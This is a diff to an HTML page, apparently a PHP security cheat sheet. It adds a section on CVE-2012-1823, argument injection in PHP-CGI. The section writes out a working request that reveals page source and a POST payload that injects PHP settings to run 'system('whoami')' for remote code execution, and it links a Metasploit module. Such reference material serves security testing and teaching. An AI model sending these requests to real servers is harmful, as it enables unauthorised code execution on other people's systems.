@@ -142,6 +142,8 @@
     
         <li><a class="" href="#deserialization">Deserialization</a></li>
     
+        <li><a class="" href="#cve-2012-1823-rce-in-php-cgi">CVE-2012-1823: RCE in PHP-CGI</a></li>
+    
     </ul>
     
 
@@ -295,6 +297,20 @@ stat
 touch
 unlink
 </code></pre>
+
+<h2 id="cve-2012-1823-rce-in-php-cgi">CVE-2012-1823: RCE in PHP-CGI</h2>
+<p>PHP-CGI up to version 5.3.12 and 5.4.2 is vulnerable to an argument injection.</p>
+<p>You can show the page source code:</p>
+<pre><code>GET https://&lt;host&gt;/file.php?-s
+</code></pre>
+
+<p>Or even execute PHP scripts (or a remote code execution)</p>
+<pre><code>POST https://&lt;host&gt;/file.php?-d%20allow_url_include%3d1%20-d%20auto_prepend_file%3dphp://input
+
+&lt;?php system('whoami'); ?&gt;
+</code></pre>
+
+<p>More details can be found on the Metasploit script <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/php_cgi_arg_injection.rb" target="_blank">here</a></p>
             
           </div>
           <footer>
